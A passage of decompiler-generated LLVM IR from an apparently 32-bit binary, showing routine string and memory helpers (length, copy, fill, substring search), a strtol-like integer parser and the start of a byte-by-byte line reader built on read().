  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 98, 99, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 94, 93, 95, 96, 97 }
  uselistorder i32 117, { 2, 1, 0 }
  uselistorder i32 111, { 1, 2, 0 }
  uselistorder i32 18, { 6, 2, 0, 3, 1, 7, 4, 5 }
  uselistorder i32 83, { 2, 1, 0 }
  uselistorder i32 23, { 2, 1, 0 }
  uselistorder i32 17, { 9, 3, 0, 10, 4, 5, 6, 7, 8, 1, 2 }
  uselistorder i32 21, { 3, 2, 0, 4, 1, 5 }
  uselistorder i32 22, { 3, 1, 0, 2, 4 }
  uselistorder i32 19, { 3, 4, 0, 1, 2 }
  uselistorder i8 3, { 1, 0 }
  uselistorder i8 6, { 4, 5, 0, 6, 7, 1, 2, 3 }
  uselistorder i32 6, { 26, 11, 1, 12, 0, 13, 14, 15, 16, 17, 18, 19, 2, 20, 3, 4, 5, 6, 21, 7, 22, 8, 23, 24, 9, 25, 10, 27, 28, 29, 30, 31 }
  uselistorder i32 33, { 7, 2, 0, 1, 8, 3, 9, 4, 10, 5, 11, 6, 12, 13 }
  uselistorder i32 13, { 6, 3, 1, 0, 4, 5, 2 }
  uselistorder i8 4, { 3, 2, 0, 1 }
  uselistorder i8 11, { 2, 3, 4, 0, 1 }
  uselistorder i32 11, { 11, 3, 0, 12, 4, 1, 13, 5, 2, 17, 14, 15, 16, 6, 7, 8, 9, 18, 19, 20, 10, 21 }
  uselistorder i8 5, { 1, 2, 0 }
  uselistorder i32 5, { 15, 11, 2, 1, 12, 13, 3, 4, 5, 6, 7, 8, 9, 10, 16, 17, 0, 18, 19, 14, 20 }
  uselistorder i32 7, { 4, 20, 5, 16, 17, 18, 6, 7, 8, 9, 10, 11, 12, 13, 14, 21, 2, 0, 22, 3, 1, 23, 24, 19, 15, 25 }
  uselistorder i32 29, { 6, 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @function_13a84, { 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1cdd4.391 to i32), { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 (i32)* @_malloc, { 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 12, { 5, 13, 8, 3, 17, 14, 15, 4, 9, 10, 16, 6, 11, 12, 7, 0, 1, 18, 19, 20, 21, 2, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
}

define i32 @function_13a08(i8* %arg1) local_unnamed_addr {
dec_label_pc_13a08:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_13a0c = load i8, i8* %arg1, align 1
  %v4_13a0c = zext i8 %v3_13a0c to i32
  %v2_13a10 = icmp eq i8 %v3_13a0c, 0
  br i1 %v2_13a10, label %dec_label_pc_13a2c, label %bb

dec_label_pc_13a2c:                               ; preds = %dec_label_pc_13a1c, %dec_label_pc_13a08
  %merge = phi i32 [ %v4_13a0c, %dec_label_pc_13a08 ], [ %v1_13a1c, %dec_label_pc_13a1c ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_13a08
  br label %dec_label_pc_13a1c

dec_label_pc_13a1c:                               ; preds = %dec_label_pc_13a1c, %bb
  %v0_13a1c = phi i32 [ %v1_13a1c, %dec_label_pc_13a1c ], [ 0, %bb ]
  %v1_13a1c = add i32 %v0_13a1c, 1
  %v2_13a20 = add i32 %v1_13a1c, %tmp
  %v3_13a20 = inttoptr i32 %v2_13a20 to i8*
  %v4_13a20 = load i8, i8* %v3_13a20, align 1
  %v2_13a24 = icmp eq i8 %v4_13a20, 0
  br i1 %v2_13a24, label %dec_label_pc_13a2c, label %dec_label_pc_13a1c

; uselistorder directives
  uselistorder i32 %v1_13a1c, { 1, 0, 2 }
}

define i32 @function_13a30(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13a30:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_13a30 = load i8, i8* %arg1, align 1
  %v3_13a30 = zext i8 %v2_13a30 to i32
  %v2_13a34 = icmp eq i8 %v2_13a30, 0
  br i1 %v2_13a34, label %dec_label_pc_13a78, label %dec_label_pc_13a3c

dec_label_pc_13a3c:                               ; preds = %dec_label_pc_13a30
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a40

dec_label_pc_13a40:                               ; preds = %dec_label_pc_13a40, %dec_label_pc_13a3c
  %v0_13a40 = phi i32 [ %v1_13a40, %dec_label_pc_13a40 ], [ 0, %dec_label_pc_13a3c ]
  %v1_13a40 = add i32 %v0_13a40, 1
  store i32 %v1_13a40, i32* %ip.global-to-local, align 4
  %v2_13a44 = add i32 %v1_13a40, %tmp
  %v3_13a44 = inttoptr i32 %v2_13a44 to i8*
  %v4_13a44 = load i8, i8* %v3_13a44, align 1
  %v2_13a48 = icmp eq i8 %v4_13a44, 0
  br i1 %v2_13a48, label %dec_label_pc_13a50, label %dec_label_pc_13a40

dec_label_pc_13a50:                               ; preds = %dec_label_pc_13a40
  %v7_13a50 = icmp eq i32 %v0_13a40, -2
  br i1 %v7_13a50, label %dec_label_pc_13a70, label %dec_label_pc_13a5c.preheader

dec_label_pc_13a5c.preheader:                     ; preds = %dec_label_pc_13a50, %dec_label_pc_13a78
  %storemerge = phi i32 [ %v3_13a30, %dec_label_pc_13a78 ], [ %v1_13a40, %dec_label_pc_13a50 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_13a68.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_13a5c

dec_label_pc_13a5c:                               ; preds = %dec_label_pc_13a5c.dec_label_pc_13a5c_crit_edge, %dec_label_pc_13a5c.preheader
  %v2_13a68 = phi i32 [ %v5_13a68, %dec_label_pc_13a5c.dec_label_pc_13a5c_crit_edge ], [ %v2_13a68.pre, %dec_label_pc_13a5c.preheader ]
  %v0_13a60 = phi i32 [ %v0_13a60.pre, %dec_label_pc_13a5c.dec_label_pc_13a5c_crit_edge ], [ %tmp, %dec_label_pc_13a5c.preheader ]
  %v0_13a5c = phi i32 [ %v0_13a5c.pre, %dec_label_pc_13a5c.dec_label_pc_13a5c_crit_edge ], [ %storemerge, %dec_label_pc_13a5c.preheader ]
  %v1_13a5c = add i32 %v0_13a5c, -1
  store i32 %v1_13a5c, i32* %r2.global-to-local, align 4
  %v1_13a60 = inttoptr i32 %v0_13a60 to i8*
  %v2_13a60 = load i8, i8* %v1_13a60, align 1
  %v5_13a60 = add i32 %v0_13a60, 1
  store i32 %v5_13a60, i32* %r1.global-to-local, align 4
  %v3_13a64 = icmp eq i32 %v0_13a5c, 0
  %v3_13a68 = inttoptr i32 %v2_13a68 to i8*
  store i8 %v2_13a60, i8* %v3_13a68, align 1
  %v4_13a68 = load i32, i32* @r0, align 4
  %v5_13a68 = add i32 %v4_13a68, 1
  store i32 %v5_13a68, i32* @r0, align 4
  br i1 %v3_13a64, label %dec_label_pc_13a70.loopexit, label %dec_label_pc_13a5c.dec_label_pc_13a5c_crit_edge

dec_label_pc_13a5c.dec_label_pc_13a5c_crit_edge:  ; preds = %dec_label_pc_13a5c
  %v0_13a5c.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_13a60.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13a5c

dec_label_pc_13a70.loopexit:                      ; preds = %dec_label_pc_13a5c
  %v0_13a70.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a70

dec_label_pc_13a70:                               ; preds = %dec_label_pc_13a70.loopexit, %dec_label_pc_13a50
  %v0_13a70 = phi i32 [ %v0_13a70.pre, %dec_label_pc_13a70.loopexit ], [ %v1_13a40, %dec_label_pc_13a50 ]
  ret i32 %v0_13a70

dec_label_pc_13a78:                               ; preds = %dec_label_pc_13a30
  store i32 %v3_13a30, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a5c.preheader

; uselistorder directives
  uselistorder i32 %v5_13a68, { 1, 0 }
  uselistorder i32 %v0_13a60, { 1, 0 }
  uselistorder i32 %v1_13a40, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v3_13a30, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13a5c.preheader, { 1, 0 }
}

define i32 @function_13a84(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13a84:
  %ip.global-to-local = alloca i32, align 4
  %v2_13a84 = icmp eq i32 %arg3, 0
  br i1 %v2_13a84, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_13a90, %dec_label_pc_13a84
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_13a84
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a90

dec_label_pc_13a90:                               ; preds = %dec_label_pc_13a90, %bb
  %v0_13a90 = phi i32 [ %v1_13a98, %dec_label_pc_13a90 ], [ 0, %bb ]
  %v2_13a90 = add i32 %v0_13a90, %arg2
  %v3_13a90 = inttoptr i32 %v2_13a90 to i8*
  %v4_13a90 = load i8, i8* %v3_13a90, align 1
  %v4_13a94 = add i32 %v0_13a90, %arg1
  %v5_13a94 = inttoptr i32 %v4_13a94 to i8*
  store i8 %v4_13a90, i8* %v5_13a94, align 1
  %v0_13a98 = load i32, i32* %ip.global-to-local, align 4
  %v1_13a98 = add i32 %v0_13a98, 1
  store i32 %v1_13a98, i32* %ip.global-to-local, align 4
  %v9_13a9c = icmp eq i32 %v1_13a98, %arg3
  br i1 %v9_13a9c, label %.loopexit, label %dec_label_pc_13a90

; uselistorder directives
  uselistorder i32 %v1_13a98, { 1, 2, 0 }
}

define i32 @function_13aa8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13aa8:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v2_13aa8 = icmp eq i32 %arg2, 0
  br i1 %v2_13aa8, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_13ab8, %dec_label_pc_13aa8
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_13aa8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13ab8

dec_label_pc_13ab8:                               ; preds = %dec_label_pc_13ab8.dec_label_pc_13ab8_crit_edge, %bb
  %v2_13ab8 = phi i32 [ %v1_13abc, %dec_label_pc_13ab8.dec_label_pc_13ab8_crit_edge ], [ 0, %bb ]
  %v0_13ab8.off0 = phi i8 [ %extract.t, %dec_label_pc_13ab8.dec_label_pc_13ab8_crit_edge ], [ 0, %bb ]
  %v4_13ab8 = add i32 %v2_13ab8, %arg1
  %v5_13ab8 = inttoptr i32 %v4_13ab8 to i8*
  store i8 %v0_13ab8.off0, i8* %v5_13ab8, align 1
  %v0_13abc = load i32, i32* %r3.global-to-local, align 4
  %v1_13abc = add i32 %v0_13abc, 1
  store i32 %v1_13abc, i32* %r3.global-to-local, align 4
  %v9_13ac0 = icmp eq i32 %v1_13abc, %arg2
  br i1 %v9_13ac0, label %.loopexit, label %dec_label_pc_13ab8.dec_label_pc_13ab8_crit_edge

dec_label_pc_13ab8.dec_label_pc_13ab8_crit_edge:  ; preds = %dec_label_pc_13ab8
  %v0_13ab8.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_13ab8.pre to i8
  br label %dec_label_pc_13ab8

; uselistorder directives
  uselistorder i32 %v1_13abc, { 1, 2, 0 }
}

define i32 @function_13acc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13acc:
  %v7_13ae0 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_13ae0, label %dec_label_pc_13ae4, label %dec_label_pc_13aec

dec_label_pc_13ae4:                               ; preds = %dec_label_pc_13b00, %dec_label_pc_13acc, %dec_label_pc_13aec
  ret i32 -1

dec_label_pc_13aec:                               ; preds = %dec_label_pc_13acc
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_13ae4, label %dec_label_pc_13af4

dec_label_pc_13af4:                               ; preds = %dec_label_pc_13aec
  br label %dec_label_pc_13b0c

dec_label_pc_13b00:                               ; preds = %dec_label_pc_13b24, %dec_label_pc_13b0c
  %v1_13b00 = add i32 %v0_13b2c, 1
  %v9_13b04 = icmp eq i32 %v1_13b00, %arg2
  br i1 %v9_13b04, label %dec_label_pc_13ae4, label %dec_label_pc_13b0c

dec_label_pc_13b0c:                               ; preds = %dec_label_pc_13b00, %dec_label_pc_13af4
  %v0_13b2c = phi i32 [ %v1_13b00, %dec_label_pc_13b00 ], [ 0, %dec_label_pc_13af4 ]
  %v0_13b18 = phi i32 [ %v1_13b18., %dec_label_pc_13b00 ], [ 0, %dec_label_pc_13af4 ]
  %v2_13b0c = add i32 %v0_13b18, %arg3
  %v3_13b0c = inttoptr i32 %v2_13b0c to i8*
  %v4_13b0c = load i8, i8* %v3_13b0c, align 1
  %v2_13b10 = add i32 %v0_13b2c, %arg1
  %v3_13b10 = inttoptr i32 %v2_13b10 to i8*
  %v4_13b10 = load i8, i8* %v3_13b10, align 1
  %v9_13b14 = icmp eq i8 %v4_13b10, %v4_13b0c
  %v1_13b18 = add i32 %v0_13b18, 1
  %v1_13b18. = select i1 %v9_13b14, i32 %v1_13b18, i32 0
  br i1 %v9_13b14, label %dec_label_pc_13b24, label %dec_label_pc_13b00

dec_label_pc_13b24:                               ; preds = %dec_label_pc_13b0c
  %v9_13b24 = icmp eq i32 %v1_13b18., %arg4
  br i1 %v9_13b24, label %dec_label_pc_13b2c, label %dec_label_pc_13b00

dec_label_pc_13b2c:                               ; preds = %dec_label_pc_13b24
  %v1_13b2c = add i32 %v0_13b2c, 1
  ret i32 %v1_13b2c

; uselistorder directives
  uselistorder i1 %v9_13b14, { 1, 0 }
  uselistorder i32 %v0_13b18, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13ae4, { 0, 2, 1 }
}

define i32 @function_13b34(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13b34:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_13b40

dec_label_pc_13b40:                               ; preds = %.thread, %dec_label_pc_13b58, %bb, %dec_label_pc_13b34
  %v0_13b40 = phi i32 [ %tmp, %dec_label_pc_13b34 ], [ %v5_13b40, %bb ], [ %v5_13b40, %dec_label_pc_13b58 ], [ %v5_13b40, %.thread ]
  %v1_13b40 = inttoptr i32 %v0_13b40 to i8*
  %v2_13b40 = load i8, i8* %v1_13b40, align 1
  %v5_13b40 = add i32 %v0_13b40, 1
  %v7_13b48 = icmp eq i8 %v2_13b40, 9
  br i1 %v7_13b48, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13b40
  br label %dec_label_pc_13b40

bb:                                               ; preds = %dec_label_pc_13b40
  %v8_13b4c = icmp eq i8 %v2_13b40, 32
  br i1 %v8_13b4c, label %dec_label_pc_13b40, label %dec_label_pc_13b58

dec_label_pc_13b58:                               ; preds = %bb
  %v7_13b58 = icmp eq i8 %v2_13b40, 10
  br i1 %v7_13b58, label %dec_label_pc_13b40, label %dec_label_pc_13b60

dec_label_pc_13b60:                               ; preds = %dec_label_pc_13b58
  %v7_13b60 = icmp eq i8 %v2_13b40, 45
  br i1 %v7_13b60, label %dec_label_pc_13c40, label %dec_label_pc_13b68

dec_label_pc_13b68:                               ; preds = %dec_label_pc_13b60
  %v7_13b68 = icmp eq i8 %v2_13b40, 43
  br i1 %v7_13b68, label %bb54, label %dec_label_pc_13b78

bb54:                                             ; preds = %dec_label_pc_13b68
  %v2_13b6c = inttoptr i32 %v5_13b40 to i8*
  %v3_13b6c = load i8, i8* %v2_13b6c, align 1
  %v6_13b6c = add i32 %v0_13b40, 2
  br label %dec_label_pc_13b78

dec_label_pc_13b78:                               ; preds = %bb54, %dec_label_pc_13b68, %dec_label_pc_13c40
  %v0_13c2442 = phi i32 [ %v5_13c40, %dec_label_pc_13c40 ], [ %v5_13b40, %dec_label_pc_13b68 ], [ %v6_13b6c, %bb54 ]
  %v0_13ba017.in = phi i8 [ %v2_13c40, %dec_label_pc_13c40 ], [ %v2_13b40, %dec_label_pc_13b68 ], [ %v3_13b6c, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_13c40 ], [ 2147483647, %dec_label_pc_13b68 ], [ 2147483647, %bb54 ]
  %v0_13c50 = phi i32 [ 1, %dec_label_pc_13c40 ], [ 0, %dec_label_pc_13b68 ], [ 0, %bb54 ]
  %v2_13b80 = urem i32 %storemerge1, %arg2
  %v2_13b90 = udiv i32 %storemerge1, %arg2
  store i32 %v2_13b90, i32* @lr, align 4
  br label %dec_label_pc_13ba0

dec_label_pc_13ba0:                               ; preds = %.thread8, %dec_label_pc_13b78
  %v0_13c24 = phi i32 [ %v5_13c24, %.thread8 ], [ %v0_13c2442, %dec_label_pc_13b78 ]
  %v2_13c1c11 = phi i32 [ %v1_13c3829, %.thread8 ], [ 0, %dec_label_pc_13b78 ]
  %v1_13bf8 = phi i32 [ %v0_13c2c27, %.thread8 ], [ 0, %dec_label_pc_13b78 ]
  %v1_13be0.in = phi i8 [ %v2_13c24, %.thread8 ], [ %v0_13ba017.in, %dec_label_pc_13b78 ]
  %v1_13be0 = zext i8 %v1_13be0.in to i32
  %v1_13ba0 = urem i32 %v1_13be0, 256
  %v1_13ba4 = add nsw i32 %v1_13ba0, -48
  %v1_13bac = add nsw i32 %v1_13ba0, -97
  %v1_13bb0 = add nsw i32 %v1_13be0, -48
  %v1_13bb4 = add nsw i32 %v1_13ba0, -65
  %tmp77 = icmp ult i32 %v1_13ba4, 10
  br i1 %tmp77, label %dec_label_pc_13be4, label %dec_label_pc_13bbc

dec_label_pc_13bbc:                               ; preds = %dec_label_pc_13ba0
  %v2_13bbc = icmp ugt i32 %v1_13bb4, 24
  %v7_13bbc = icmp eq i32 %v1_13bb4, 25
  %v2_13bc0 = xor i1 %v7_13bbc, true
  %v3_13bc0 = and i1 %v2_13bbc, %v2_13bc0
  br i1 %v3_13bc0, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_13bbc
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_13bbc, %bb55
  %v0_13bd421 = phi i32 [ %v1_13bb0, %dec_label_pc_13bbc ], [ 0, %bb55 ]
  %v2_13bc4 = xor i1 %v2_13bbc, true
  %v3_13bc4 = or i1 %v7_13bbc, %v2_13bc4
  br i1 %v3_13bc4, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_13bd4 = phi i32 [ %v0_13bd421, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_13bc0, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_13bcc = icmp ugt i32 %v1_13bac, 24
  %v11_13bcc = icmp eq i32 %v1_13bac, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_13bd0 = phi i1 [ %v7_13bbc, %bb58 ], [ %v11_13bcc, %bb59 ]
  %v0_13bd0 = phi i1 [ %v2_13bbc, %bb58 ], [ %v6_13bcc, %bb59 ]
  %v2_13bd0 = xor i1 %v1_13bd0, true
  %v3_13bd0 = and i1 %v0_13bd0, %v2_13bd0
  br i1 %v3_13bd0, label %dec_label_pc_13c2c, label %dec_label_pc_13bd4

dec_label_pc_13bd4:                               ; preds = %bb60
  %v2_13bd4 = icmp eq i32 %v0_13bd4, 0
  %. = select i1 %v2_13bd4, i32 87, i32 55
  %v2_13be0 = sub nsw i32 %v1_13be0, %.
  br label %dec_label_pc_13be4

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13ba0, %dec_label_pc_13bd4
  %v0_13bf837 = phi i32 [ %v1_13bb4, %dec_label_pc_13ba0 ], [ %., %dec_label_pc_13bd4 ]
  %v3_13c1c12 = phi i32 [ %v1_13bb0, %dec_label_pc_13ba0 ], [ %v2_13be0, %dec_label_pc_13bd4 ]
  %v6_13be8 = icmp slt i32 %v3_13c1c12, %arg2
  br i1 %v6_13be8, label %dec_label_pc_13bec, label %dec_label_pc_13c2c

dec_label_pc_13bec:                               ; preds = %dec_label_pc_13be4
  %v3_13bec = icmp uge i32 %v2_13c1c11, %v2_13b90
  %v9_13bec = icmp eq i32 %v2_13c1c11, %v2_13b90
  %v2_13bf0 = xor i1 %v3_13bec, true
  %v3_13bf0 = or i1 %v9_13bec, %v2_13bf0
  br i1 %v3_13bf0, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_13bec
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_13bec, %bb63
  %v0_13bf836 = phi i32 [ %v0_13bf837, %dec_label_pc_13bec ], [ 0, %bb63 ]
  %v2_13bf4 = xor i1 %v9_13bec, true
  %v3_13bf4 = and i1 %v3_13bec, %v2_13bf4
  br i1 %v3_13bf4, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_13bf8 = phi i32 [ %v0_13bf836, %bb64 ], [ 1, %bb65 ]
  %tmp78 = icmp slt i32 %v1_13bf8, 0
  %v4_13bf8 = zext i1 %tmp78 to i32
  %v5_13bf8 = or i32 %v0_13bf8, %v4_13bf8
  %v7_13bf8 = icmp eq i32 %v5_13bf8, 0
  br i1 %v7_13bf8, label %dec_label_pc_13c04, label %.thread8

dec_label_pc_13c04:                               ; preds = %bb66
  %v7_13c14 = icmp sgt i32 %v3_13c1c12, %v2_13b80
  br i1 %v7_13c14, label %bb69, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_13c04
  br label %bb70

bb69:                                             ; preds = %dec_label_pc_13c04
  %v2_13c18 = icmp eq i1 %v9_13bec, false
  br i1 %v2_13c18, label %bb70, label %.thread8

bb70:                                             ; preds = %bb69, %.thread5
  %v4_13c1c13 = mul i32 %v2_13c1c11, %arg2
  %v5_13c1c14 = add i32 %v3_13c1c12, %v4_13c1c13
  br label %.thread8

.thread8:                                         ; preds = %bb69, %bb66, %bb70
  %v1_13c3829 = phi i32 [ %v2_13c1c11, %bb69 ], [ %v2_13c1c11, %bb66 ], [ %v5_13c1c14, %bb70 ]
  %v0_13c2c27 = phi i32 [ -1, %bb69 ], [ -1, %bb66 ], [ 1, %bb70 ]
  %v1_13c24 = inttoptr i32 %v0_13c24 to i8*
  %v2_13c24 = load i8, i8* %v1_13c24, align 1
  %v5_13c24 = add i32 %v0_13c24, 1
  br label %dec_label_pc_13ba0

dec_label_pc_13c2c:                               ; preds = %dec_label_pc_13be4, %bb60
  %v1_13c2c = icmp slt i32 %v1_13bf8, 0
  %v2_13c50 = icmp eq i32 %v0_13c50, 0
  br i1 %v1_13c2c, label %dec_label_pc_13c50, label %dec_label_pc_13c34

dec_label_pc_13c34:                               ; preds = %dec_label_pc_13c2c
  br i1 %v2_13c50, label %bb72, label %bb71

bb71:                                             ; preds = %dec_label_pc_13c34
  %v2_13c38 = sub i32 0, %v2_13c1c11
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_13c34, %bb71
  %v23_13c3c = phi i32 [ %v2_13c1c11, %dec_label_pc_13c34 ], [ %v2_13c38, %bb71 ]
  ret i32 %v23_13c3c

dec_label_pc_13c40:                               ; preds = %dec_label_pc_13b60
  %v1_13c40 = inttoptr i32 %v5_13b40 to i8*
  %v2_13c40 = load i8, i8* %v1_13c40, align 1
  %v5_13c40 = add i32 %v0_13b40, 2
  br label %dec_label_pc_13b78

dec_label_pc_13c50:                               ; preds = %dec_label_pc_13c2c
  %.76 = select i1 %v2_13c50, i32 2147483647, i32 -2147483648
  ret i32 %.76

; uselistorder directives
  uselistorder i1 %v9_13bec, { 1, 0, 2 }
  uselistorder i1 %v3_13bec, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_13bbc, { 1, 2, 0 }
  uselistorder i1 %v2_13bbc, { 1, 0, 2 }
  uselistorder i32 %v1_13ba0, { 1, 2, 0 }
  uselistorder i32 %v1_13be0, { 1, 0, 2 }
  uselistorder i32 %v1_13bf8, { 1, 0 }
  uselistorder i32 %v2_13c1c11, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_13c24, { 1, 0 }
  uselistorder i32 %v2_13b90, { 1, 0, 2 }
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v5_13b40, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_13b40, { 0, 1, 3, 2 }
  uselistorder i32 25, { 8, 9, 7, 3, 0, 1, 4, 2, 5, 6, 10, 11 }
  uselistorder i32 24, { 5, 6, 8, 2, 1, 9, 10, 11, 12, 13, 3, 14, 0, 7, 4, 15 }
  uselistorder i8 32, { 1, 7, 2, 3, 0, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i8 9, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_13be4, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_13b78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13b40, { 1, 2, 0, 3 }
}

define i32 @function_13c60(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13c60:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_13c60 = load i32, i32* @r4, align 4
  store i32 %v3_13c60, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13c78

dec_label_pc_13c78:                               ; preds = %dec_label_pc_13ca4.dec_label_pc_13c78_crit_edge, %dec_label_pc_13c60
  %v0_13c7c = phi i32 [ %v0_13c7c.pre, %dec_label_pc_13ca4.dec_label_pc_13c78_crit_edge ], [ %arg3, %dec_label_pc_13c60 ]
  %v0_13c78 = phi i32 [ %v1_13c90, %dec_label_pc_13ca4.dec_label_pc_13c78_crit_edge ], [ %tmp, %dec_label_pc_13c60 ]
  %v3_13c84 = inttoptr i32 %v0_13c78 to i32*
  %v4_13c84 = call i32 @read(i32 %v0_13c7c, i32* %v3_13c84, i32 1)
  %v7_13c88 = icmp eq i32 %v4_13c84, 1
  %v0_13c8c = load i32, i32* %r4.global-to-local, align 4
  %v1_13c90 = add i32 %v0_13c8c, 1
  store i32 %v1_13c90, i32* %r4.global-to-local, align 4
  %v0_13c98 = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_13c88, label %dec_label_pc_13c98, label %dec_label_pc_13cb0

dec_label_pc_13c98:                               ; preds = %dec_label_pc_13c78
  %v1_13c98 = add i32 %v0_13c98, 1
  store i32 %v1_13c98, i32* %r5.global-to-local, align 4
  %v0_13c9c = load i32, i32* %r7.global-to-local, align 4
  %v7_13ca0 = icmp sgt i32 %v0_13c9c, %v1_13c98
  br i1 %v7_13ca0, label %dec_label_pc_13ca4, label %dec_label_pc_13cb0

dec_label_pc_13ca4:                               ; preds = %dec_label_pc_13c98
  %v1_13ca4 = inttoptr i32 %v0_13c8c to i8*
  %v2_13ca4 = load i8, i8* %v1_13ca4, align 1
  %v7_13ca8 = icmp eq i8 %v2_13ca4, 10
  br i1 %v7_13ca8, label %dec_label_pc_13cb0, label %dec_label_pc_13ca4.dec_label_pc_13c78_crit_edge

dec_label_pc_13ca4.dec_label_pc_13c78_crit_edge:  ; preds = %dec_label_pc_13ca4
  %v0_13c7c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13c78

dec_label_pc_13cb0:                               ; preds = %dec_label_pc_13c78, %dec_label_pc_13ca4, %dec_label_pc_13c98
